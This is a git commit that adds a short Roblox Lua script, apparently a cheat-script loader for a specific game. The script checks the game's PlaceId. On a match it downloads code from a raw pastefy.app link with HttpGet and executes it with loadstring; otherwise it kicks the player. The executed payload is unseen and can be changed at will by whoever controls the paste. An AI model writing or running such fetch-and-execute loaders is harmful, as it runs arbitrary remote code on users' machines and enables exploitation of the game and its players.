7b781752b20cc450642c7b92798fa2ae5a6489ce
hubhollow <kalsmjddhsbd@gmail.com>
2026-01-19 18:12:26 -0300

    Add script to load content based on PlaceId

---
+++ TsunamiBrainrot.lua
@@ -0,0 +1,5 @@
+if game.PlaceId == 131623223084840 then
+    loadstring(game:HttpGet("https://pastefy.app/AEi7abNA/raw"))()
+else
+    game:GetService("Players").LocalPlayer:Kick("PlaceId incorreto")
+end
